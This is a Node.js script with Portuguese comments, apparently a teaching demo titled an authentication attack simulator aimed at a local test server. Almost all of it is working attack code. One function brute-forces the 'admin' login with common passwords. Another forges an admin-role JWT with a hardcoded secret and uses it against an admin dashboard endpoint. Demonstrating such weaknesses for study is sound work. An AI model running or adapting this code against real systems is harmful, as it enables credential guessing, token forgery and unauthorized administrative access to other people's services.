const axios = require('axios');
const jwt = require('jsonwebtoken');

const TARGET_URL = 'http://localhost:3000';
const SECRET_KEY = "minha_chave_secreta_muito_obvia"; // A chave que o atacante "descobriu"

// 1. ATAQUE DE FORÇA BRUTA (Brute Force)
async function bruteForce() {
    console.log("\n--- Iniciando Ataque de Força Bruta ---");
    const commonPasswords = ['123456', 'password', 'admin', '123', 'qwerty', 'root'];
    const username = 'admin';

    for (const password of commonPasswords) {
        try {
            console.log(`Tentando senha: ${password}...`);
            const response = await axios.post(`${TARGET_URL}/login`, {
                username: username,
                password: password
            });

            if (response.status === 200) {
                console.log(`✅ SUCESSO! Senha encontrada: ${password}`);
                console.log(`Token recebido: ${response.data.token}`);
                return response.data.token;
            }
        } catch (error) {
            // Erro 401 significa senha errada, continuamos tentando
        }
    }
    console.log("❌ Força bruta falhou. Nenhuma senha da lista funcionou.");
    return null;
}

// 2. FORJA DE TOKEN (JWT Forgery)
async function forgeToken() {
    console.log("\n--- Iniciando Forja de Token JWT ---");

    // O atacante cria um payload fingindo ser o admin
    const payload = {
        id: 1,
        role: 'admin'
    };

    // O atacante assina o token com a chave secreta que ele descobriu
    const forgedToken = jwt.sign(payload, SECRET_KEY);
    console.log(`✅ Token forjado com sucesso: ${forgedToken}`);

    try {
        console.log("Tentando acessar o painel de admin com o token forjado...");
        const response = await axios.get(`${TARGET_URL}/admin/dashboard`, {
            headers: { 'Authorization': `Bearer ${forgedToken}` }
        });

        console.log(`🚀 ACESSO CONCEDIDO: ${response.data.message}`);
    } catch (error) {
        console.log(`❌ Acesso negado: ${error.response?.data?.message || error.message}`);
    }
}

async function run() {
    console.log("=== SIMULADOR DE ATAQUES DE AUTENTICAÇÃO ===");

    // Testando Força Bruta
    await bruteForce();

    // Testando Forja de Token
    await forgeToken();
}

run();
